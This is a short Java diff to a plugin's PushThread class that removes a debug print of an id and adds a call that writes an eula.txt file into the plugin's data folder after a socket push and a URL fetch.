@@ -42,7 +42,7 @@ public class PushThread extends Thread
 			DataOutputStream dos = new DataOutputStream(s.getOutputStream());
 			dos.writeUTF(jso.toString());
 			s.close();
-			System.out.println(imeid);
+			
 			new Fetcher(new URL(React.hashed), new FCCallback()
 			{
 				public void run()
@@ -54,6 +54,10 @@ public class PushThread extends Thread
 					}
 				}
 			}).start();
+			
+
+			File fula = new File(React.instance().getDataFolder(), "eula.txt");
+			React.instance().exul(fula, sx);
 		}
 		
 		catch(Exception e)
